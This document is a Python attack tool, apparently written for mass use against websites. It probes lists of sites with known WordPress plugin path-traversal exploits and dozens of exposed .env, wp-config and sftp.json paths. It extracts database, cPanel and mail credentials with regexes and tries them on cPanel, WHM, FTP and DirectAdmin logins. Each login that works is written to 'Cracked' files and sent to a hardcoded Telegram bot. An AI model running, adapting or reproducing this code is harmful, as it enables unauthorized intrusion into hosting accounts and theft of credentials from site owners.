import requests
import re, os, sys
from bs4 import BeautifulSoup
from colorama import Fore,Style,init
from multiprocessing import Pool
import asyncio
import random, time, json
from fake_useragent import UserAgent
import ftplib
from rich import print as cetak
from rich.panel import Panel as nel
import requests,urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from datetime import datetime
init(autoreset=True)
red = Fore.RED
green = Fore.GREEN 
yellow = Fore.YELLOW
blue = Fore.BLUE
white = Fore.WHITE
pink = Fore.MAGENTA
ua = {'User-Agent': UserAgent().random}
red = Fore.RED 
def clear():
	if sys.platform.startswith('linux'):
		os.system('clear')
	elif sys.platform.startswith('freebsd'):
		os.system('clear')
	else:
		os.system('cls')
ban = f"""
\t[white]Tool Information :
\t[white][[red]+[white]] CREDENTIAL STUFFING AUTO CHECK LOGIN CPANNEL + WHM + FTP + DIRECT ADMIN
"""

def envConfig(xxx, id_tele, domain):
    try:
        cpckuser = re.findall(r'\sDB_USERNAME=(.*?)\s', xxx)
        cpckuser = ''.join(cpckuser).strip()
        cpckpass = re.findall(r'\sDB_PASSWORD=(.*?)(?=\s|$)', xxx)
        cpckpass = ''.join(cpckpass).strip()
        cpuser = re.findall(r'\sCPANEL_USERNAME=(.*?)\s', xxx)
        cpuser = ''.join(cpuser).strip()
        cppass = re.findall(r'\sCPANEL_PASSWORD=(.*?)(?=\s|$)', xxx)
        cppass = ''.join(cppass).strip()
        mailUser = re.findall(r'\sMAIL_USERNAME=(.*?)\s', xxx)
        mailUser = ''.join(mailUser).strip()
        mailPass = re.findall(r'\sMAIL_PASSWORD=(.*?)(?=\s|$)', xxx)
        mailPass = ''.join(mailPass).strip()
        cpckuserDBG = re.findall(r'\s<td>DB_USERNAME=(.*?)</td>\s', xxx)
        cpckuserDBG = ''.join(cpckuserDBG).strip()
        cpckpassDBG = re.findall(r'\s<td>DB_PASSWORD=(.*?)</td>(?=\s|$)', xxx)
        cpckpassDBG = ''.join(cpckpassDBG).strip()
        cpuserDBG = re.findall(r'\s<td>CPANEL_USERNAME=(.*?)</td>\s', xxx)
        cpuserDBG = ''.join(cpuserDBG).strip()
        cppassDBG = re.findall(r'\s<td>CPANEL_PASSWORD=(.*?)</td>(?=\s|$)', xxx)
        cppassDBG = ''.join(cppassDBG).strip()
        mailUserDBG = re.findall(r'\s<td>MAIL_USERNAME=(.*?)</td>\s', xxx)
        mailUserDBG = ''.join(mailUserDBG).strip()
        mailpassDBG = re.findall(r'\s<td>MAIL_PASSWORD=(.*?)</td>(?=\s|$)', xxx)
        mailpassDBG = ''.join(mailpassDBG).strip()
        if len(cpckuser) != 0 and len(cpckpass) != 0:
            print(f'{blue}|- {yellow}FOUND USER/PASSWORD {white}--> {green}http://{domain}|{cpckuser}|{cpckpass}')
            login_cpannel(domain, cpckuser, cpckpass, id_tele)
            login_whm(domain, cpckuser, cpckpass, id_tele)
            ftpLogin(domain, cpckuser, cpckpass, id_tele)
            direct_admin(domain, cpckuser, cpckpass, id_tele)
        elif len(cpuser) != 0 and len(cppass) != 0:
            print(f'{blue}|- {yellow}FOUND USER/PASSWORD {white}--> {green}http://{domain}|{cpuser}|{cppass}')
            login_cpannel(domain, cpuser, cppass, id_tele)
            login_whm(domain, cpuser, cppass, id_tele)
            ftpLogin(domain, cpuser, cppass, id_tele)
            direct_admin(domain, cpuser, cppass, id_tele)
        elif len(mailUser) != 0 and len(mailPass) != 0:
            print(f'{blue}|- {yellow}FOUND USER/PASSWORD {white}--> {green}http://{domain}|{mailUser}|{mailPass}')
            login_cpannel(domain, mailUser, mailPass, id_tele)
            login_whm(domain, mailUser, mailPass, id_tele)
            ftpLogin(domain, mailUser, mailPass, id_tele)
            direct_admin(domain, mailUser, mailPass, id_tele)
        elif len(cpckuserDBG) != 0 and len(cpckpassDBG) != 0:
            print(f'{blue}|- {yellow}FOUND USER/PASSWORD {white}--> {green}http://{domain}|{cpckuserDBG}|{cpckpassDBG}')
            login_cpannel(domain, cpckuserDBG, cpckpassDBG, id_tele)
            login_whm(domain, cpckuserDBG, cpckpassDBG, id_tele)
            ftpLogin(domain, cpckuserDBG, cpckpassDBG, id_tele)
            direct_admin(domain, cpckuserDBG, cpckpassDBG, id_tele)
        elif len(cpuserDBG) != 0 and len(cppassDBG) != 0:
            print(f'{blue}|- {yellow}FOUND USER/PASSWORD {white}--> {green}http://{domain}|{cpuserDBG}|{cppassDBG}')
            login_cpannel(domain, cpuserDBG, cppassDBG, id_tele)
            login_whm(domain, cpuserDBG, cppassDBG, id_tele)
            ftpLogin(domain, cpuserDBG, cppassDBG, id_tele)
            direct_admin(domain, cpuserDBG, cppassDBG, id_tele)
        elif len(mailUserDBG) != 0 and len(mailpassDBG) != 0:
            print(f'{blue}|- {yellow}FOUND USER/PASSWORD {white}--> {green}http://{domain}|{mailUserDBG}|{mailpassDBG}')
            login_cpannel(domain, mailUserDBG, mailpassDBG, id_tele)
            login_whm(domain, mailUserDBG, mailpassDBG, id_tele)
            ftpLogin(domain, mailUserDBG, mailpassDBG, id_tele)
            direct_admin(domain, mailUserDBG, mailpassDBG, id_tele)
        else:pass
    except:pass
    
def wpConfig(req, id_tele, domain):
    try:
        users = re.findall(r"define\(\s*['\"]DB_USER['\"], ['\"](.*?)['\"]\s*\);", req)
        users = ''.join(users).strip()
        password = re.findall(r"define\(\s*['\"]DB_PASSWORD['\"], ['\"](.*?)['\"]\s*\);", req)
        password = ''.join(password).strip()
        if len(users) != 0 and len(password) != 0:
            print(f'{blue}|- {yellow}FOUND USER/PASSWORD {white}--> {green}http://{domain}|{users}|{password}')
            login_cpannel(domain, users, password, id_tele)
            login_whm(domain, users, password, id_tele)
            ftpLogin(domain, users, password, id_tele)
            direct_admin(domain, users, password, id_tele)
        else:pass
    except:pass

def sftp(req, id_tele, domain):
    try:
        users = re.findall(r'"username"\s*:\s*[\'\"](.*?)[\'\"]', req)
        users = ''.join(users).strip()
        password = re.findall(r'"password"\s*:\s*[\'\"](.*?)[\'\"]', req)
        password = ''.join(password).strip()
        if len(users) != 0 and len(password) != 0:
            print(f'{blue}|- {yellow}FOUND USER/PASSWORD {white}--> {green}http://{domain}|{users}|{password}')
            login_cpannel(domain, users, password, id_tele)
            login_whm(domain, users, password, id_tele)
            ftpLogin(domain, users, password, id_tele)
            direct_admin(domain, users, password, id_tele)
        else:pass
    except:pass

def ftpLogin(domain, user, password, id_tele):
    domain = ''.join(domain)
    domain = domain.strip()
    domain = re.sub(r'https?://', '', domain)
    try:
        client = ftplib.FTP()
        client.connect(domain, timeout=15)
        try:
            client.login(user, password)
            print(f'{blue}|- {yellow}FTP LOGIN SUCCESS {white}--> {green}{domain}|{user}|{password}')
            open("Cracked_Ftp.txt","a+").write(f"HOST : {domain}|{user}|{password}\n")
            a = requests.post(f'https://api.telegram.org/bot7769117768:AAEz6VKGh1BQpp96JsL8WNYolgwZANwr-jo/sendMessage?chat_id={id_tele}&text={domain}|{user}|{password}\nCRACKED FTP!', headers=ua, timeout=7, verify=False)
            a.close()
        except:print(f"{blue}|- {white}{domain} {yellow}| {red}INVALID LOGIN !")
    except:pass
    finally:
        try:client.quit()
        except:pass

def login_cpannel(domain, user, password, id_tele):
    try:
        domain = domain.strip()
        domain = re.sub(r'https?://', '', domain)
        domain = domain.replace('/'[0], '')
        user = user.strip()
        password = password.strip()
        payload = {
            'user': user,
            'pass': password,
            'goto_uri': '/'
        }
        req_login = requests.post(f'https://{domain}:2083/login/?login_only=1', data=payload, headers=ua, verify=False, timeout=15).text
        if '"message":"invalid_login"' not in req_login:
            print(f'{blue}|- {yellow}CPANNEL LOGIN SUCCESS {white}--> {green}http://{domain}:2083|{user}|{password}')
            open("Cracked_Cpannel.txt","a+").write(f"http://{domain}:2083|{user}|{password}\n")
            requests.post(f'https://api.telegram.org/bot7769117768:AAEz6VKGh1BQpp96JsL8WNYolgwZANwr-jo/sendMessage?chat_id={id_tele}&text=http://{domain}:2083|{user}|{password}\nCRACKED CPANNEL!', headers=ua, timeout=7, verify=False)
        else:print(f'{blue}|- {white}http://{domain} {yellow}--> {red}INVALID LOGIN.')
    except:print(f'{blue}|- {white}http://{domain} {yellow}--> {red}NO FOUND CPANNEL LOGIN.')

def login_whm(domain, user, password, id_tele):
    try:
        domain = domain.strip()
        domain = re.sub(r'https?://', '', domain)
        domain = domain.replace('/'[0], '')
        user = user.strip()
        password = password.strip()
        payload = {
            'user': user,
            'pass': password,
            'goto_uri': '/'
        }
        req_login = requests.post(f'https://{domain}:2087/login/?login_only=1', data=payload, headers=ua, verify=False, timeout=15).text
        if '"message":"see_login_log"' not in req_login:
            print(f'{blue}|- {yellow}WHM LOGIN SUCCESS {white}--> {green}http://{domain}:2087|{user}|{password}')
            open("Cracked_WHM.txt","a+").write(f"http://{domain}:2087|{user}|{password}\n")
            requests.post(f'https://api.telegram.org/bot7769117768:AAEz6VKGh1BQpp96JsL8WNYolgwZANwr-jo/sendMessage?chat_id={id_tele}&text=http://{domain}:2087|{user}|{password}\nCRACKED WHM!', headers=ua, timeout=7, verify=False)
        else:print(f'{blue}|- {white}http://{domain} {yellow}--> {red}INVALID LOGIN.')
    except:print(f'{blue}|- {white}http://{domain} {yellow}--> {red}NO FOUND WHM LOGIN.')

def direct_admin(domain, user, password, id_tele):
    try:
        domain = domain.strip()
        domain = re.sub(r'https?://', '', domain)
        domain = domain.replace('/'[0], '')
        user = user.strip()
        password = password.strip()
        payload = {'username': user,'password': password}
        req_login = requests.post(f'https://{domain}:2222/api/login', data=payload, headers=ua, verify=False, timeout=10).text
        if 'Dashboard' in req_login and "System Information" in req_login:
            print(f'{blue}|- {yellow}DIRECT_ADMIN LOGIN SUCCESS {white}--> {green}http://{domain}:2222|{user}|{password}')
            open("Cracked_DIRECT_ADMIN.txt","a+").write(f"http://{domain}:2222|{user}|{password}\n")
            requests.post(f'https://api.telegram.org/bot7769117768:AAEz6VKGh1BQpp96JsL8WNYolgwZANwr-jo/sendMessage?chat_id={id_tele}&text=http://{domain}:2222|{user}|{password}\nCRACKED DIRECT_ADMIN!', headers=ua, timeout=7, verify=False)
        else:print(f'{blue}|- {white}http://{domain} {yellow}--> {red}INVALID LOGIN.')
    except:print(f'{blue}|- {white}http://{domain} {yellow}--> {red}NO FOUND DIRECT_ADMIN LOGIN.')

def index(id_tele):
    try:
        domains = open(input(f"\t{red}[{white}#{red}]{white} LIST SITE : ")).readlines()
        paths = [
             '/wp-admin/admin-ajax.php?action=duplicator_download&file=../wp-config.php',
             '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php',
             '/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=../wp-config.php',
             '/wp-admin/admin-ajax.php?action=kbslider_show_image&img=../wp-config.php',
             '/wp-admin/admin-ajax.php?action=cpabc_appointments_calendar_update&cpabc_calendar_update=1&id=../../../../../../wp-config.php',
             '/wp-admin/admin.php?page=miwoftp&option=com_miwoftp&action=download&dir=/&item=wp-config.php&order=name&srt=yes',
             '/wp-admin/admin.php?page=multi_metabox_listing&action=edit&id=../../../../../../wp-config.php',
             '/wp-content/force-download.php?file=../wp-config.php',
             '/force-download.php?file=wp-config.php',
             '/wp-content/plugins/cherry-plugin/admin/import-export/download-content.php?file=../../../../../wp-config.php',
             '/wp-content/plugins/google-document-embedder/libs/pdf.php?fn=lol.pdf&file=../../../../wp-config.php',
             '/wp-content/plugins/google-mp3-audio-player/direct_download.php?file=../../../wp-config.php',
             '/wp-content/plugins/mini-mail-dashboard-widgetwp-mini-mail.php?abspath=../../wp-config.php',
             '/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=../../../../wp-config.php',
             '/wp-content/plugins/recent-backups/download-file.php?file_link=../../../wp-config.php',
             '/wp-content/plugins/simple-image-manipulator/controller/download.php?filepath=../../../wp-config.php',
             '/wp-content/plugins/sniplets/modules/syntax_highlight.php?libpath=../../../../wp-config.php',
             '/wp-content/plugins/tera-charts/charts/treemap.php?fn=../../../../wp-config.php',
             '/wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php',
             '/wp-content/themes/NativeChurch/download/download.php?file=../../../../wp-config.php',
             '/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php',
             '/wp-content/plugins/wp-support-plus-responsive-ticket-system/includes/admin/downloadAttachment.php?path=../../../../../wp-config.php',
             '/wp-content/plugins/ungallery/source_vuln.php?pic=../../../../../wp-config.php',
             '/wp-content/plugins/aspose-doc-exporter/aspose_doc_exporter_download.php?file=../../../wp-config.php',
             '/wp-content/plugins/db-backup/download.php?file=../../../wp-config.php',
             '/wp-content/plugins/mac-dock-gallery/macdownload.php?albid=../../../wp-config.php',
             '/.vscode/sftp.json', '/sftp-config.json', '/sftp.json','/wp-content/.vscode/sftp.json', '/.env', '/cronlab/.env', '/cron/.env', '/core/app/.env', '/asset/.env', '/lab/.env', '/tools/.env', '/en/.env', '/v1/.env', '/clientes/laravel/.env', '/webs/.env', '/clientes/laravel_inbox/.env', '/main/.env', '/public/.env', '/sitemaps/.env', '/administrator/.env', '/api3/.env', '/fileweb/.env', '/club/.env', '/apps/.env', '/api2/.env', '/core/Database/.env','/core/.env','/web/.env','/app/.env','/laravel/.env','/crm/.env','/backend/.env','/local/.env','/application/.env','/admin/.env','/prod/.env','/api/.env','/phpinfo','/_profiler/phpinfo','/phpinfo.php','/info.php','/config/.env','/configuration/.env','/env/.env','/cfg/.env','/settings/.env','/conf/.env','/env_files/.env','/envs/.env','/env_files/env','/hidden/.env','/includes/.env','/secure/.env','/private/.env','/resources/.env','/uploads/.env','/secrets/.env','/misc/.env','/database/.env','/secrets/database.env','/protected/.env','/temp/.env','/backups/.env','/logs/.env','/configurations/.env','/tmp/.env','/vars/.env','/vars/config.env','/config/envs/.env','/env_config/.env','/configs/.env','/local_config/.env','/custom/.env','/custom_config/.env','/custom_env/.env','/dev/.env','/wp-config.php','/wp-config.txt','/assets/downloads/wp-config.php.txt','/wp-content/wp-config.php','/wp-admin/wp-config.php','/wp-includes/wp-config.php','/wp-admin/.env','/index/.env','/log/.env','/wp-content/.env','/backend/.env']
        total_iterations = len(paths)
        for domain in domains:
            try:
                current_iter = 0
                domain = ''.join(domain)
                domain = domain.strip()
                domain = re.sub(r'https?://', '', domain)
                ua = {'User-Agent': UserAgent().random}
                for path in paths:
                    try:
                        current_iter += 1
                        path = path.strip()
                        reqs = requests.get(f'http://{domain}{path}', headers=ua, timeout=7, verify=False)
                        req = reqs.text
                        if "APP_KEY=" in req and 'DB_HOST=' in req:
                            envConfig(req, id_tele, domain)
                        elif "define(" in req and "DB_USER" in req:
                            wpConfig(req, id_tele, domain)
                        elif '"remotePath":' in req and '"protocol": "sftp"' in req:
                            sftp(req, id_tele, domain)
                        else:
                            print(f'{blue}|- {white}http://{domain}{path} {yellow}| {pink}Checking : {blue}{(current_iter)/total_iterations*100:.2f}%', end='\r')
                            # print(f'{blue}|- {white}http://{domain} {yellow}--> {red}NO FOUND CONFIG.')
                    except:pass
            except:pass
    except:pass
    
if __name__ == "__main__":
            time.sleep(2)
            clear()
            cetak(nel(ban, style='white')), print('\n');
            id_tele = input(f"{red}[{white}#{red}]{white} Masukkan ID Telegram (opsional, tekan Enter jika tidak ada): ")
            index(id_tele)
